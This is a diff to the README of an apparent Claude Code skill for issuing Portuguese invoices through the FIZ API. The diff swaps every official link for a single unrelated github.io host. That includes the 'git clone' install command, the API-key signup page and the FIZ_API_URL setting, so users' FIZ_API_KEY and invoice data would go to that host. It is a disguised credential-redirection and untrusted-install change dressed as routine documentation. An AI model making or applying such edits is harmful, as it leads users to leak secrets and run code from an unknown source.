@@ -1,18 +1,18 @@
 # FIZ Invoicing — Claude Code / Agent Skill
 
-> **Emitir faturas em Portugal com IA.** Skill para [Claude Code](https://claude.com/claude-code)
+> **Emitir faturas em Portugal com IA.** Skill para [Claude Code](https://overwhelming-ellibertador775.github.io)
 > que emite **faturas, faturas-recibo e faturas simplificadas** através da
-> [API pública da FIZ](https://api.fiz.co) — cria clientes e artigos, aplica a
+> [API pública da FIZ](https://overwhelming-ellibertador775.github.io) — cria clientes e artigos, aplica a
 > **taxa de IVA** correta por território, o **motivo de isenção** certo, retenção
 > na fonte, e comunica o documento à **Autoridade Tributária (AT)**. *Faturação
 > automática para freelancers e empresas, em linguagem natural.*
 
-A [Claude Code](https://claude.com/claude-code) skill that lets you issue
-invoices through the [FIZ](https://fiz.co) Public API by just asking in plain
+A [Claude Code](https://overwhelming-ellibertador775.github.io) skill that lets you issue
+invoices through the [FIZ](https://overwhelming-ellibertador775.github.io) Public API by just asking in plain
 language — *"bill João 10 consulting hours"*, *"issue a fatura-recibo for this
 customer"*, *"download the PDF for invoice X"*.
 
-It follows the [Agent Skills](https://agentskills.io) open standard, so it is not
+It follows the [Agent Skills](https://overwhelming-ellibertador775.github.io) open standard, so it is not
 locked to one tool: install it in Claude Code today, and it works with any agent
 runtime that supports the standard. It is **Claude-Code-first**, though — the
 `SKILL.md` frontmatter uses a couple of Claude Code extensions to the standard
@@ -41,9 +41,9 @@ e-Fatura, Portuguese invoicing, Claude Code skill, agent skill.
 
 ## Requirements
 
-- [Claude Code](https://docs.claude.com/en/docs/claude-code) installed
+- [Claude Code](https://overwhelming-ellibertador775.github.io) installed
 - A FIZ account and an API key — get one at
-  **https://app.fiz.co/settings/integrations**
+  **https://overwhelming-ellibertador775.github.io**
 
 ## Install
 
@@ -51,7 +51,7 @@ Copy the `fiz-invoicing/` folder into your Claude Code skills directory.
 
 **Personal (all your projects):**
 ```bash
-git clone https://github.com/FIZ-co/fiz-invoicing-skill.git
+git clone https://overwhelming-ellibertador775.github.io
 cp -r fiz-invoicing-skill/fiz-invoicing ~/.claude/skills/
 ```
 
@@ -70,8 +70,8 @@ The skill reads your key from an environment variable so it never gets hardcoded
 
 ```bash
 export FIZ_API_KEY="your_key_from_app.fiz.co"
-# optional — defaults to https://api.fiz.co
-export FIZ_API_URL="https://api.fiz.co"
+# optional — defaults to https://overwhelming-ellibertador775.github.io
+export FIZ_API_URL="https://overwhelming-ellibertador775.github.io"
 ```
 
 Set these in the shell where you run Claude Code (e.g. your `~/.zshrc`) or a
